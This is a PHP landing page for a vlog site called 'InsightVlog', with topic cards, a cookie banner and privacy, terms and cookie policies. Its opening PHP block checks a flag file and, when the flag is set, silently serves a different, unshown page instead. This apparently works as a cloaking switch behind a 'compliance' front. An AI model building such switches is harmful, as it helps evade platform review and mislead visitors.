<?php
 
$switchFile = __DIR__ . '/switch.txt';

 $mode = file_exists($switchFile) ? trim(file_get_contents($switchFile)) : '0';
 
if ($mode === '1') {

     readfile(__DIR__ . '/class/index.html');

     exit; }
 ?>
  
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Independent informative vlogs and practical insights. Watch, learn and explore thoughtful video content.">
    <meta name="robots" content="index, follow">
    <title>InsightVlog | Informative Vlogs & Practical Insights</title>
    <style>
        :root {
            --primary: #7c3aed;
            --primary-dark: #5b21b6;
            --accent: #f5f3ff;
            --text: #1f2937;
            --gray: #6b7280;
            --light: #f9fafb;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            line-height: 1.65;
            color: var(--text);
            background: #fff;
        }
        a { color: var(--primary); text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }

        /* Header */
        header {
            background: #fff;
            box-shadow: 0 1px 4px rgba(0,0,0,0.07);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
        }
        .logo {
            font-size: 1.55rem;
            font-weight: 700;
            color: var(--primary);
        }
        .logo span { color: var(--primary-dark); }
        nav ul {
            display: flex;
            list-style: none;
            gap: 28px;
        }
        nav a {
            color: var(--text);
            font-weight: 500;
            font-size: 0.95rem;
        }
        nav a:hover { color: var(--primary); text-decoration: none; }

        /* Hero */
        .hero {
            background: linear-gradient(135deg, var(--accent) 0%, #fff 100%);
            padding: 80px 0 70px;
            text-align: center;
        }
        .hero h1 {
            font-size: clamp(2rem, 5vw, 2.7rem);
            margin-bottom: 16px;
            color: var(--primary-dark);
        }
        .hero p {
            font-size: 1.2rem;
            color: var(--gray);
            max-width: 620px;
            margin: 0 auto 28px;
        }
        .btn {
            display: inline-block;
            background: var(--primary);
            color: #fff;
            padding: 13px 30px;
            border-radius: 8px;
            font-weight: 600;
            transition: background 0.2s;
        }
        .btn:hover {
            background: var(--primary-dark);
            text-decoration: none;
            color: #fff;
        }

        /* Sections */
        section { padding: 70px 0; }
        section:nth-child(even) { background: var(--light); }
        h2 {
            font-size: 1.85rem;
            margin-bottom: 12px;
            color: var(--primary-dark);
            text-align: center;
        }
        .section-sub {
            text-align: center;
            color: var(--gray);
            max-width: 640px;
            margin: 0 auto 40px;
        }

        /* Cards */
        .cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 26px;
        }
        .card {
            background: #fff;
            padding: 26px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .card h3 {
            margin-bottom: 10px;
            color: var(--primary);
            font-size: 1.2rem;
        }
        .card p { color: var(--gray); font-size: 0.95rem; }

        /* Topics list */
        .topics {
            max-width: 750px;
            margin: 0 auto;
        }
        .topics li {
            margin-bottom: 14px;
            padding-left: 8px;
            color: #374151;
        }

        /* About */
        .about-content {
            max-width: 780px;
            margin: 0 auto;
            text-align: center;
        }
        .about-content p { margin-bottom: 16px; color: #444; }

        /* Contact */
        .contact-box {
            max-width: 480px;
            margin: 0 auto;
            background: #fff;
            padding: 32px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            text-align: center;
        }
        .contact-box p { margin-bottom: 10px; }

        /* Footer */
        footer {
            background: #111;
            color: #ccc;
            padding: 50px 0 30px;
            font-size: 0.9rem;
        }
        .footer-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 30px;
            margin-bottom: 40px;
        }
        .footer-grid h4 {
            color: #fff;
            margin-bottom: 14px;
            font-size: 1rem;
        }
        .footer-grid ul { list-style: none; }
        .footer-grid li { margin-bottom: 8px; }
        .footer-grid a { color: #aaa; }
        .footer-grid a:hover { color: #fff; }
        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 24px;
            text-align: center;
            font-size: 0.85rem;
            color: #888;
        }

        /* Cookie Banner */
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #1a1a1a;
            color: #eee;
            padding: 16px 20px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            z-index: 9999;
            font-size: 0.9rem;
        }
        #cookie-banner.hidden { display: none; }
        #cookie-banner button {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
        }
        #cookie-banner button:hover { background: var(--primary-dark); }
        #cookie-banner .reject { background: #555; margin-left: 8px; }
        #cookie-banner a { color: #c4b5fd; }

        /* Legal sections */
        .legal-section {
            display: none;
            max-width: 800px;
            margin: 40px auto;
            padding: 30px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        .legal-section.active { display: block; }
        .legal-section h2 { text-align: left; margin-bottom: 18px; }
        .legal-section p, .legal-section ul { margin-bottom: 14px; color: #444; }
        .legal-section ul { padding-left: 22px; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: var(--primary);
            font-weight: 600;
        }

        /* Responsive */
        @media (max-width: 700px) {
            nav ul { display: none; }
            .hero { padding: 60px 0 50px; }
            section { padding: 50px 0; }
        }
    </style>
</head>
<body>

<!-- Cookie Consent Banner -->
<div id="cookie-banner">
    <div>
        We use essential cookies to make this site work. Analytics cookies are used only with your consent to improve the experience.
        <a href="#privacy" onclick="showLegal('privacy')">Privacy Policy</a>
    </div>
    <div>
        <button onclick="acceptCookies()">Accept</button>
        <button class="reject" onclick="rejectCookies()">Reject non-essential</button>
    </div>
</div>

<!-- Header -->
<header>
    <div class="container nav">
        <div class="logo">Insight<span>Vlog</span></div>
        <nav>
            <ul>
                <li><a href="#home">Home</a></li>
                <li><a href="#topics">Topics</a></li>
                <li><a href="#videos">Featured Videos</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#contact">Contact</a></li>
            </ul>
        </nav>
    </div>
</header>

<!-- Hero -->
<section class="hero" id="home">
    <div class="container">
        <h1>Informative Vlogs & Practical Insights</h1>
        <p>Thoughtful video content focused on learning, everyday life, and useful knowledge — shared in a clear and honest way.</p>
        <a href="#videos" class="btn">View Featured Videos</a>
    </div>
</section>

<!-- Topics -->
<section id="topics">
    <div class="container">
        <h2>What You’ll Find Here</h2>
        <p class="section-sub">Content is created to inform and share perspectives. No hype, just practical information.</p>
        <div class="cards">
            <div class="card">
                <h3>Everyday Learning</h3>
                <p>Simple explanations of useful skills, habits and ideas that can be applied in daily life.</p>
            </div>
            <div class="card">
                <h3>Travel & Places</h3>
                <p>Honest observations from different locations, focusing on culture, practical tips and personal experience.</p>
            </div>
            <div class="card">
                <h3>Tech & Tools</h3>
                <p>Clear overviews of common digital tools and how they can be used productively.</p>
            </div>
            <div class="card">
                <h3>Lifestyle Notes</h3>
                <p>Reflections on routines, productivity and maintaining balance — shared without pressure or exaggeration.</p>
            </div>
        </div>
    </div>
</section>

<!-- Featured Videos -->
<section id="videos">
    <div class="container">
        <h2>Featured Video Topics</h2>
        <p class="section-sub">Examples of the kind of content published on this channel.</p>
        <ul class="topics">
            <li>How to organise your digital files for long-term clarity</li>
            <li>Simple packing methods that actually work for short trips</li>
            <li>Understanding basic camera settings without jargon</li>
            <li>Building a calm morning routine that fits real life</li>
            <li>Common mistakes when starting a YouTube channel (and how to avoid them)</li>
            <li>Honest thoughts on balancing content creation with everyday responsibilities</li>
        </ul>
        <p style="text-align:center; margin-top:30px; color:var(--gray); font-size:0.95rem;">
            Videos are hosted on platforms such as YouTube. This website itself does not host video files.
        </p>
    </div>
</section>

<!-- About -->
<section id="about">
    <div class="container">
        <h2>About This Channel</h2>
        <div class="about-content">
            <p>InsightVlog is an independent informative video project focused on sharing practical knowledge and personal observations.</p>
            <p>The goal is to create clear, useful content without exaggerated claims or aggressive marketing. All videos are produced with the intention of informing viewers in a straightforward manner.</p>
            <p>This website serves as a simple hub to describe the type of content published. It does not sell products or services directly.</p>
        </div>
    </div>
</section>

<!-- Contact -->
<section id="contact">
    <div class="container">
        <h2>Contact</h2>
        <p class="section-sub">Have a question about the content or the website? Feel free to reach out.</p>
        <div class="contact-box">
            <p><strong>Email:</strong> hello@insightvlog.example</p>
            <p style="margin-top:14px; font-size:0.9rem; color:var(--gray);">
                This is a generic demonstration site. Replace the email address with your real contact details before going live.
            </p>
        </div>
    </div>
</section>

<!-- Legal Content -->
<div class="container">
    <div id="privacy" class="legal-section">
        <h2>Privacy Policy</h2>
        <p><strong>Last updated:</strong> September 2026</p>
        <p>We respect your privacy. This policy explains what limited data we may collect and how it is used.</p>
        <p><strong>Information we collect:</strong></p>
        <ul>
            <li>Essential technical data needed for the website to function (including cookie preference).</li>
            <li>Optional analytics data only if you give consent.</li>
            <li>Any information you voluntarily send us by email.</li>
        </ul>
        <p><strong>How we use data:</strong> To operate the website, respond to enquiries, and (with consent) understand how the site is used so we can improve it.</p>
        <p><strong>Cookies:</strong> Essential cookies are always active. Analytics cookies are used only after you give consent.</p>
        <p><strong>Your rights:</strong> You may request access, correction or deletion of your personal data by contacting us.</p>
        <p><strong>Data controller:</strong> [Your Full Legal Name / Company Name], [Full Address], [Country]<br>
        Email: hello@insightvlog.example</p>
        <p>We do not sell personal data. We follow applicable data protection principles including those of the GDPR where relevant.</p>
        <a href="#" class="back-link" onclick="hideLegal(); return false;">← Back to site</a>
    </div>

    <div id="terms" class="legal-section">
        <h2>Terms of Use</h2>
        <p><strong>Last updated:</strong> September 2026</p>
        <p>By using this website you agree to these terms.</p>
        <ul>
            <li>All content is provided for general informational purposes only.</li>
            <li>We make reasonable efforts to keep information accurate, but we do not guarantee completeness or current accuracy.</li>
            <li>You may not misuse the website, attempt to disrupt it, or use it for any illegal purpose.</li>
            <li>All intellectual property on this site remains with the site owner or its licensors.</li>
            <li>External platforms (such as YouTube) have their own terms and privacy policies.</li>
        </ul>
        <p>These terms are governed by the laws of the applicable jurisdiction of the site operator. We may update these terms from time to time.</p>
        <a href="#" class="back-link" onclick="hideLegal(); return false;">← Back to site</a>
    </div>

    <div id="cookies" class="legal-section">
        <h2>Cookie Policy</h2>
        <p>We use the following types of cookies:</p>
        <ul>
            <li><strong>Essential cookies:</strong> Required for basic site functionality and to remember your cookie preference. These cannot be disabled.</li>
            <li><strong>Analytics cookies (optional):</strong> Help us understand how visitors use the site. These are used only if you give consent.</li>
        </ul>
        <p>You can change your preference at any time by clearing your browser cookies or using the options in the cookie banner.</p>
        <a href="#" class="back-link" onclick="hideLegal(); return false;">← Back to site</a>
    </div>
</div>

<!-- Footer -->
<footer>
    <div class="container">
        <div class="footer-grid">
            <div>
                <h4>InsightVlog</h4>
                <p>Independent informative video content focused on practical knowledge and honest insights.</p>
            </div>
            <div>
                <h4>Legal</h4>
                <ul>
                    <li><a href="#privacy" onclick="showLegal('privacy')">Privacy Policy</a></li>
                    <li><a href="#terms" onclick="showLegal('terms')">Terms of Use</a></li>
                    <li><a href="#cookies" onclick="showLegal('cookies')">Cookie Policy</a></li>
                </ul>
            </div>
            <div>
                <h4>Contact</h4>
                <ul>
                    <li><a href="#contact">Get in touch</a></li>
                    <li>hello@insightvlog.example</li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2026 InsightVlog. All rights reserved.</p>
            <p style="margin-top:8px;">
                This is a generic demonstration website created for compliance and educational purposes.<br>
                Replace placeholder content, email and legal entity details before public use.
            </p>
        </div>
    </div>
</footer>

<script>
    // Cookie consent
    function acceptCookies() {
        localStorage.setItem('insightvlog_cookie_consent', 'accepted');
        document.getElementById('cookie-banner').classList.add('hidden');
    }
    function rejectCookies() {
        localStorage.setItem('insightvlog_cookie_consent', 'rejected');
        document.getElementById('cookie-banner').classList.add('hidden');
    }
    if (localStorage.getItem('insightvlog_cookie_consent')) {
        document.getElementById('cookie-banner').classList.add('hidden');
    }

    // Show / hide legal sections
    function showLegal(id) {
        document.querySelectorAll('.legal-section').forEach(el => el.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        window.scrollTo({ top: document.getElementById(id).offsetTop - 80, behavior: 'smooth' });
    }
    function hideLegal() {
        document.querySelectorAll('.legal-section').forEach(el => el.classList.remove('active'));
    }
</script>

</body>
</html>

